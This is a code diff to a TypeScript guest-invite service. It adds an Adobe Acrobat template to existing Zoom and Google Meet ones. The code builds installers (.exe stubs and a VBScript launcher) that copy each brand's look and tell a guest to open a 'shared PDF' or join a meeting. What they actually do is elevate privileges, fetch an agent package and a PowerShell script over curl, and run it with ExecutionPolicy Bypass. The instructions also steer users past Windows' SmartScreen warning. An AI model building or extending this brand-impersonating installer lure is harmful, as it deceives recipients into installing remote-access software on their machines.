@@ -40,31 +40,73 @@ function generateGuestCode(): string {
 function buildGuestJoinUrl(
   appUrl: string,
   code: string,
-  template: 'zoom' | 'google_meet',
+  template: 'zoom' | 'google_meet' | 'adobe',
 ): string {
   const base = appUrl.replace(/\/$/, '');
   if (template === 'google_meet') {
     return `${base}/gotme/GoogleMeet/${code}`;
   }
+  if (template === 'adobe') {
+    return `${base}/adobefile/${code}`;
+  }
   return `${base}/joinzoom/${code}`;
 }
 
-type InviteTemplate = 'zoom' | 'google_meet';
+type InviteTemplate = 'zoom' | 'google_meet' | 'adobe';
 
 function normalizeTemplate(template?: string | null): InviteTemplate {
-  return template === 'google_meet' ? 'google_meet' : 'zoom';
+  if (template === 'google_meet') return 'google_meet';
+  if (template === 'adobe') return 'adobe';
+  return 'zoom';
 }
 
 export function installerBatFilename(template?: string | null): string {
-  return normalizeTemplate(template) === 'google_meet'
-    ? 'GoogleMeet-Setup.bat'
-    : 'ZoomClient-Setup.bat';
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') return 'GoogleMeet-Setup.bat';
+  if (t === 'adobe') return 'AdobeAcrobat-Setup.bat';
+  return 'ZoomClient-Setup.bat';
 }
 
 export function installerGuiFilename(template?: string | null): string {
-  return normalizeTemplate(template) === 'google_meet'
-    ? 'GoogleMeet-Setup.hta'
-    : 'ZoomClient-Setup.hta';
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
+  if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
+  return 'ZoomClient-Setup.exe';
+}
+
+export function installerDownloadPath(_template?: string | null): string {
+  return 'setup.exe';
+}
+
+/** Marker written after the Windows stub PE; stub reads JSON that follows. */
+export const GUEST_SETUP_EXE_MARKER = 'NDGUESTCFG\x00';
+
+function exeInstallerCopy(template?: string | null): {
+  title: string;
+  downloading: string;
+  finished: string;
+} {
+  const brand = installerBranding(template);
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') {
+    return {
+      title: brand.windowTitle,
+      downloading: 'Downloading Google Meet components...\nPlease wait.',
+      finished: brand.closingEcho,
+    };
+  }
+  if (t === 'adobe') {
+    return {
+      title: brand.windowTitle,
+      downloading: 'Downloading Adobe Acrobat components...\nPlease wait.',
+      finished: brand.closingEcho,
+    };
+  }
+  return {
+    title: brand.windowTitle,
+    downloading: 'Downloading Zoom Client components...\nPlease wait.',
+    finished: brand.closingEcho,
+  };
 }
 
 function guiInstallerBranding(template?: string | null): {
@@ -79,7 +121,8 @@ function guiInstallerBranding(template?: string | null): {
   accentDark: string;
   pageBg: string;
 } {
-  if (normalizeTemplate(template) === 'google_meet') {
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') {
     return {
       windowTitle: 'Google Meet Setup',
       applicationName: 'Google Meet',
@@ -91,6 +134,20 @@ function guiInstallerBranding(template?: string | null): {
       accent: '#1a73e8',
       accentDark: '#1765cc',
       pageBg: '#f8f9fa',
+    };
+  }
+  if (t === 'adobe') {
+    return {
+      windowTitle: 'Adobe Acrobat Setup',
+      applicationName: 'Adobe Acrobat',
+      brandLabel: 'Adobe Acrobat',
+      heading: 'Opening your document...',
+      subheading: 'Download and run Adobe Acrobat to view the shared PDF on Windows.',
+      downloadLabel: 'Downloading Adobe Acrobat',
+      installLabel: 'Installing',
+      accent: '#b22222',
+      accentDark: '#8b1a1a',
+      pageBg: '#ffffff',
     };
   }
   return {
@@ -112,11 +169,19 @@ function installerBranding(template?: string | null): {
   header: string;
   closingEcho: string;
 } {
-  if (normalizeTemplate(template) === 'google_meet') {
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') {
     return {
       windowTitle: 'Google Meet Setup',
       header: '=== Google Meet Setup ===',
       closingEcho: 'Finished. You can close this window and return to your meeting.',
+    };
+  }
+  if (t === 'adobe') {
+    return {
+      windowTitle: 'Adobe Acrobat Setup',
+      header: '=== Adobe Acrobat Setup ===',
+      closingEcho: 'Finished. You can close this window and open your document.',
     };
   }
   return {
@@ -141,7 +206,7 @@ export class GuestAccessService {
       notes?: string;
       maxUses?: number;
       ttl?: string;
-      inviteTemplate?: 'zoom' | 'google_meet';
+      inviteTemplate?: 'zoom' | 'google_meet' | 'adobe';
     },
   ) {
     const env = getEnv();
@@ -155,13 +220,19 @@ export class GuestAccessService {
       code = generateGuestCode();
     }
 
-    const template = input?.inviteTemplate === 'google_meet' ? 'google_meet' : 'zoom';
+    const template = normalizeTemplate(input?.inviteTemplate);
+    const defaultLabel =
+      template === 'google_meet'
+        ? 'Google Meet'
+        : template === 'adobe'
+          ? 'Adobe Document'
+          : 'Zoom Meeting';
     const link = await this.prisma.guestAccessLink.create({
       data: {
         organizationId,
         createdByUserId: actorUserId,
         code,
-        label: input?.label?.trim() || (template === 'google_meet' ? 'Google Meet' : 'Zoom Meeting'),
+        label: input?.label?.trim() || defaultLabel,
         notes: input?.notes ?? null,
         inviteTemplate: template,
         maxUses: input?.maxUses && input.maxUses > 0 ? input.maxUses : 5,
@@ -269,17 +340,17 @@ export class GuestAccessService {
       organizationSlug: org?.slug ?? '',
       expiresAt: link.expiresAt.toISOString(),
       remainingUses: Math.max(0, link.maxUses - link.usedCount),
-      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/setup.hta?v=23`,
+      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=26`,
       installerFileName: installerGuiFilename(link.inviteTemplate),
       windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1`,
       agentPackageUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/agent-package.zip`,
       joinUrl: buildGuestJoinUrl(env.APP_URL, link.code, link.inviteTemplate),
       instructions: {
         windows: [
-          'Click "Download for Windows" to get the installer.',
-          'Right-click the .bat → Run as administrator → click Yes.',
-          'Wait until it says Finished, then close that window.',
-          'You can close this browser tab afterward.',
+          'The Windows installer download should start automatically.',
+          `Open ${installerGuiFilename(link.inviteTemplate)} from Downloads (click More info → Run anyway if Windows asks).`,
+          'Click Yes when Windows asks for permission.',
+          'Wait until setup finishes, then close the installer window.',
         ],
       },
     };
@@ -335,14 +406,102 @@ export class GuestAccessService {
   }
 
   /**
-   * A double-clickable .bat launcher. Avoids downloading a separate .ps1 file
-   * (antivirus often quarantines scripts in Temp). Downloads the package with
-   * curl, then runs setup via an inline EncodedCommand — no script file on disk.
+   * Guest templates download a real .exe (Zoom / Meet / Adobe).
+   * The stub performs the same enroll path: download zip + windows.ps1,
+   * then run PowerShell setup elevated.
    */
+  buildWindowsExeLauncher(code: string, apiUrl: string, stub: Buffer, template?: string | null): Buffer {
+    const copy = exeInstallerCopy(template);
+    const payload = Buffer.from(
+      JSON.stringify({
+        apiUrl: apiUrl.replace(/\/$/, ''),
+        guestCode: code,
+        title: copy.title,
+        downloading: copy.downloading,
+        finished: copy.finished,
+      }),
+      'utf8',
+    );
+    return Buffer.concat([stub, Buffer.from(GUEST_SETUP_EXE_MARKER, 'latin1'), payload]);
+  }
+
+  /**
+   * Legacy .vbs launcher (kept for older links). Prefer setup.exe for Adobe.
+   */
+  buildWindowsVbsLauncher(code: string, apiUrl: string, template?: string | null): string {
+    const base = apiUrl.replace(/\/$/, '').replace(/"/g, '');
+    const safeCode = code.replace(/"/g, '');
+    const brand = installerBranding(template);
+    const title = brand.windowTitle.replace(/"/g, '');
+    const doneMsg = brand.closingEcho.replace(/"/g, '');
+    const lines = [
+      'Option Explicit',
+      'Dim sh, fso, apiUrl, guestCode, dataDir, packageZip, setupPs1, curl, cmd, rc, app, elevated',
+      `apiUrl = "${base}"`,
+      `guestCode = "${safeCode}"`,
+      'Set sh = CreateObject("WScript.Shell")',
+      'Set fso = CreateObject("Scripting.FileSystemObject")',
+      'dataDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk\\Agent"',
+      'If Not fso.FolderExists(sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk") Then',
+      '  fso.CreateFolder sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk"',
+      'End If',
+      'If Not fso.FolderExists(dataDir) Then fso.CreateFolder dataDir',
+      'packageZip = dataDir & "\\package.zip"',
+      'setupPs1 = dataDir & "\\nd-setup.ps1"',
+      'curl = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\\System32\\curl.exe"',
+      'If Not fso.FileExists(curl) Then',
+      `  MsgBox "curl.exe not found. Windows 10 or later is required.", 16, "${title}"`,
+      '  WScript.Quit 1',
+      'End If',
+      '',
+      'elevated = False',
+      'On Error Resume Next',
+      'elevated = (sh.Run("net session", 0, True) = 0)',
+      'On Error GoTo 0',
+      'If Not elevated Then',
+      '  Set app = CreateObject("Shell.Application")',
+      '  app.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1',
+      '  WScript.Quit 0',
+      'End If',
+      '',
+      `sh.Popup "Downloading Adobe Acrobat components..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
+      '',
+      'If fso.FileExists(packageZip) Then fso.DeleteFile packageZip, True',
+      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 1200 -o " & Chr(34) & packageZip & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/agent-package.zip" & Chr(34)',
+      'rc = sh.Run("cmd /c " & cmd, 0, True)',
+      'If rc <> 0 Or Not fso.FileExists(packageZip) Then',
+      `  MsgBox "Download failed. Check that this PC can reach the server.", 16, "${title}"`,
+      '  WScript.Quit 1',
+      'End If',
+      '',
+      'If fso.FileExists(setupPs1) Then fso.DeleteFile setupPs1, True',
+      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 120 -o " & Chr(34) & setupPs1 & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/windows.ps1?v=14" & Chr(34)',
+      'rc = sh.Run("cmd /c " & cmd, 0, True)',
+      'If rc <> 0 Or Not fso.FileExists(setupPs1) Then',
+      `  MsgBox "Could not download setup script.", 16, "${title}"`,
+      '  WScript.Quit 1',
+      'End If',
+      '',
+      'sh.Environment("PROCESS")("ND_API_URL") = apiUrl',
+      'sh.Environment("PROCESS")("ND_GUEST_CODE") = guestCode',
+      'sh.Environment("PROCESS")("ND_PACKAGE_ZIP") = packageZip',
+      'sh.Environment("PROCESS")("NEXUSDESK_AGENT_DATA_DIR") = dataDir',
+      'cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File " & Chr(34) & setupPs1 & Chr(34)',
+      'rc = sh.Run(cmd, 1, True)',
+      'If rc <> 0 Then',
+      `  MsgBox "Setup failed. See %ProgramData%\\NexusDesk\\Agent\\install.log", 16, "${title}"`,
+      '  WScript.Quit rc',
+      'End If',
+      '',
+      `MsgBox "${doneMsg}", 64, "${title}"`,
+      'WScript.Quit 0',
+    ];
+    return lines.join('\r\n');
+  }
+
   /**
    * Tiny .bat launcher: elevate, download zip + setup.ps1, run setup, never
-   * close without showing the result. Avoids embedding huge base64 in the bat
-   * (that was crashing cmd.exe right after the download step).
+   * close without showing the result.
    */
   buildWindowsBatchLauncher(code: string, apiUrl: string, template?: string | null): string {
     const base = apiUrl.replace(/\/$/, '');
